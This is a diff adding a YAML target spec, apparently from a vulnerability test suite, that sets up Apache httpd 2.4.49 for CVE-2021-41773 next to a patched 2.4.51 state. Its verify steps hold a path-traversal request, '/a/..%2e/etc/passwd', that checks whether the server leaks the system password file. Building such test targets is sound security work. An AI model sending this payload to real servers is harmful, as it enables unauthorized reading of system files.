@@ -1,0 +1,23 @@
+apiVersion: vulnsuite/v1
+kind: Target
+metadata:
+  id: demo-target
+  summary: demo
+  vuln_refs: [CVE-2021-41773, VS-DEMO-1, GHSA-abcd-1234]
+  severity: high
+base:
+  kind: image
+  image: httpd:2.4.49
+  digest: sha256:0000000000000000000000000000000000000000000000000000000000000000
+service:
+  ports: [ { container: 80, protocol: http } ]
+  command: "httpd-foreground"
+  healthcheck: { http: { path: /, status: 200 }, timeout: 60s }
+states:
+  vulnerable:
+    verify:
+      - http: { raw_path: "/a/..%2e/etc/passwd", status: 200, timeout: 2.5, body_matches: "root:" }
+  patched:
+    image: httpd:2.4.51
+    verify:
+      - http: { raw_path: "/a/..%2e/etc/passwd", status_in: [403, 404] }
